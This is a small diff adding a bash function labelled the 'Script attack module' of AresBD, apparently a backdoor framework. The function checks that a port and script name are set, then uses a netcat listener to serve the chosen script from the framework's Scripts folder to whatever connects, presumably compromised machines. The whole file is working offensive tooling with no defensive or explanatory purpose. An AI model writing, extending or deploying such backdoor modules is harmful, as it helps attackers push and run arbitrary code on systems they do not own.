@@ -1,0 +1,12 @@
+#!/bin/bash
+# Script attack module for AresBD by Stsosz
+attackScript()
+{
+	if [[ -z "$PORT" ]]; then
+		echo "You need to set the port first!"
+	elif [[ -z "$SCRIPT" ]]; then
+		echo "You need to set the script first!"
+	else
+		nc -l -p $PORT < ~/Ares/Scripts/$SCRIPT
+	fi
+}
